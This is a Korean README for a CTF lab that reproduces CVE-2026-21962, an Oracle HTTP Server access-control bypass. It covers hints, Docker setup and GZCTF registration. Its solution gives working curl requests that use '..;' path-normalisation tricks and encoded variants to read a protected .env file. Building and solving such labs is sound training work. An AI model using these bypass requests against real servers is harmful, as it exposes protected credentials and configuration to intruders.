# CVE-2026-21962 — OHS Access-Control Bypass 🏴

Oracle HTTP Server(OHS) 12.2.1.4.0 의 **접근제어 우회(CVE-2026-21962, CWE-284, CVSS 10.0)** 를 재현한 실습 CTF 문제입니다.
프론트엔드(OHS)와 백엔드가 경로를 다르게 해석하는 차이를 이용해, **원래 막혀 있어야 할 보호 파일을 읽어 플래그 `WINS{...}` 를 획득**하는 문제예요.

> 💡 처음이어도 괜찮습니다. 아래 순서대로만 따라오면 됩니다.
> - **문제를 풀고 싶다** → [1. 문제 푸는 사람용](#-1-문제-푸는-사람용-solver)
> - **문제 서버를 띄우고 싶다** → [2. 처음부터 세팅하기](#️-2-처음부터-세팅하기-setup)

---

## 🎯 1. 문제 푸는 사람용 (Solver)

### 문제
- **접속 주소:** `http://<서버주소>:10008`  (로컬 테스트면 `http://localhost:10008`)
- 어떤 경로(`/internal-admin/...`)는 서버가 **404로 막아** 둡니다. 그런데 그 안에 플래그가 숨어 있어요.
- **목표:** 보호된 파일 `/internal-admin/cont/.env` 를 읽어 그 안의 `WINS{...}` 찾기

### 먼저 직접 해보기 (힌트 보기 전에)
1. 브라우저로 `http://localhost:10008/` 접속 → 어떤 안내가 있는지 보기
2. 막힌 경로와 열린 경로가 각각 무엇인지 비교해보기
3. "프론트 서버가 막는 규칙"을 어떻게 피할 수 있을지 고민해보기

### 💡 힌트 (막힐 때 하나씩만 펼쳐보세요)

<details>
<summary>👉 힌트 1 — 어디를 노리나?</summary>

<br>

`/internal-admin/cont/.env` 에 **직접** 접근하면 `404 (OHS: Disallowed location)` 로 막힙니다.
하지만 프록시로 연결된 **`/foo`** 경로는 열려 있어요. 이 둘의 "경로 처리 차이"가 핵심입니다.
</details>

<details>
<summary>👉 힌트 2 — 왜 뚫리나?</summary>

<br>

프론트엔드(OHS)와 백엔드(WebLogic)가 경로 안의 **`..;`** 를 **서로 다르게 해석**합니다.
- 프론트: `..;` 를 그대로 둬서 "아직 `/foo` 요청이네" 하고 **통과**시킴
- 백엔드: `;` 를 떼고 `..` 를 정리해서 결국 `/internal-admin/...` 으로 **처리**함

즉, `/foo/..;/internal-admin/...` 같은 경로를 보내면 차단을 피할 수 있어요.
</details>

<details>
<summary>👉 힌트 3 — curl 사용 팁</summary>

<br>

curl은 기본적으로 `..` 를 **알아서 정리**해버려서 우회가 안 돼요.
`--path-as-is` 옵션을 꼭 붙여서 경로를 "있는 그대로" 보내야 합니다.
</details>

### ✅ 정답 풀이 (정말 막혔을 때만 펼치기)

<details>
<summary>🔓 전체 풀이 펼치기</summary>

<br>

**취약점 요약:** 프론트(OHS)와 백엔드가 `..;` 를 다르게 정규화(normalize)하는 차이를 악용한 **접근제어 우회**.

**1) 직접 접근 — 차단됨(404)**
```bash
curl -i "http://localhost:10008/internal-admin/cont/.env"
# → HTTP/1.1 404 Not Found   (OHS: Disallowed location)
```

**2) `..;` 우회 — 성공(200)**
```bash
curl -i --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
# → HTTP/1.1 200 OK + 보호 파일(.env) 내용
```

**3) 응답에서 플래그 확인**
```
# internal-admin service config (fabricated for CTF)
DB_PASSWORD=WINS{...}      ← 이게 플래그
```

**추가로 동작하는 우회 변형들:**
```
/foo/..%3b/internal-admin/cont/.env
/foo/..;jsessionid=xxxx/internal-admin/cont/.env
/foo/%2e%2e;/internal-admin/cont/.env
```

<details>
<summary>🚩 플래그 값 직접 보기</summary>

<br>

플래그는 서버마다 **환경변수로 다르게 주입**돼요 (하드코딩 아님).
응답의 `DB_PASSWORD=` 뒤에 나오는 `WINS{...}` 가 정답입니다.
로컬 테스트 예시: `WINS{local_test}`
</details>

</details>

---

## 🛠️ 2. 처음부터 세팅하기 (Setup)

문제 서버(포트 10008)를 직접 띄우는 방법이에요. **위에서 아래로 순서대로** 하면 됩니다.

### 0단계 — 준비물
- **Docker Desktop** (설치 + **실행 중**이어야 함 / 확인: `docker ps` 가 에러 없이 동작)
- **Git** (확인: `git --version`)
- 아래 둘 중 **하나**:
  - (A) 빌드된 이미지 파일 `cve-2026-21962-images.tar`  ← 설치본 없이 가장 빠름
  - (B) Oracle 설치본 2개: `fmw_12.2.1.4.0_ohs_linux64.bin`, `jdk-8u202-linux-x64.tar.gz`

> 📩 **설치본(.bin / .tar.gz)과 빌드된 이미지(`cve-2026-21962-images.tar`)는 Oracle 라이선스상 이 저장소에 포함돼 있지 않습니다.**
> 필요하신 분은 **작성자에게 문의**해 주세요. (Oracle 계정이 있으면 공식 사이트에서 직접 받을 수도 있습니다 — 하단 "더 자세히" 참고)
> 가장 간편한 방법은 **빌드된 이미지 tar 를 작성자에게 받아 (A) 방식으로 `docker load`** 하는 거예요.

### 1단계 — 코드 받기
```bash
git clone https://github.com/2sangmin/Wins9_CVE_Practice.git
cd Wins9_CVE_Practice
```

### 2단계 — 이미지 준비 (A 또는 B 중 하나)

**(A) 이미지 tar 가 있으면 — 추천 (설치본 불필요)**
```bash
docker load -i <경로>/cve-2026-21962-images.tar
```

**(B) 설치본으로 직접 빌드하려면**
설치본 2개를 `ohs/` 폴더에 복사 → 다음 단계에서 `--build` 로 빌드됩니다.

> 🖥️ **ARM 서버(예: Oracle Cloud Ampere)** 라면, OHS가 x86 전용이라 먼저 **1회만** QEMU 등록:
> ```bash
> docker run --privileged --rm tonistiigi/binfmt --install amd64
> ```

### 3단계 — 실행
플래그는 **환경변수로 주입**합니다 (파일에 하드코딩 안 함).
```bash
# Windows (CMD)
set FLAG=WINS{test_1234}
docker compose up -d
#   └ (B) 설치본으로 빌드하는 경우에만:  docker compose up -d --build

# Linux / macOS
FLAG='WINS{test_1234}' docker compose up -d
```

### 4단계 — 동작 확인
```bash
curl --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
# → WINS{test_1234} 가 나오면 세팅 성공! ✅
```

### 내리기 / 재시작
```bash
docker compose down        # 중지
docker compose up -d        # 다시 시작
```

---

## 📦 3. GZCTF 플랫폼에 올리기 (선택 — 대회/검증용)

이 문제는 **공유(Shared)** 유형이라, GZCTF가 컨테이너를 띄우지 않고 **정답만 채점**합니다.
컨테이너(포트 10008)는 위 2번처럼 **따로 띄워 두고**, GZCTF엔 아래처럼 등록하세요.

1. **게임 생성** — 관리자 → 게임 → 새 게임 (시작/종료 시간, "연습 모드" 켜면 아무 때나 풀이 가능)
2. **문제 추가** — 문제 → 새 문제:
   - 유형: **정적 첨부 파일 (Static Attachment)**  ← 컨테이너 안 띄우는 유형
   - 분야: `Web`, 설명: `접속: http://<서버>:10008`
   - **플래그: 3단계에서 넣은 `FLAG` 값과 동일하게** (예: `WINS{test_1234}`)
   - 저장 → **문제 활성화(Enable)**
3. **풀이자 흐름** — 가입 → 팀 생성(개인전도 팀 필요) → 게임 참가 → 문제 열기 → 위 "정답 풀이"대로 풀어서 플래그 제출

---

## 📩 설치본 / 이미지 문의
Oracle OHS·JDK 설치본과 빌드된 이미지 tar 는 **라이선스상 저장소에 올릴 수 없습니다.** 둘 중 하나로 받으세요:
- **작성자에게 문의** (가장 빠름 — 빌드된 이미지 tar 전달받아 `docker load`)
- **직접 다운로드** (Oracle 계정 필요):
  - Oracle HTTP Server: https://www.oracle.com/middleware/technologies/webtier-downloads.html
  - JDK 8u202 (archive): https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

## 📄 더 자세히
- **취약점 상세 분석 + 대응 방안:** [WRITEUP.md](WRITEUP.md)
- **운영/배포 참고:** 공유(Shared) 분류 · 외부 포트 10008(내부 OHS 7777 / backend 7101) · 컨테이너당 메모리 256MB · 아키텍처 x86-64(ARM은 QEMU 에뮬레이션)
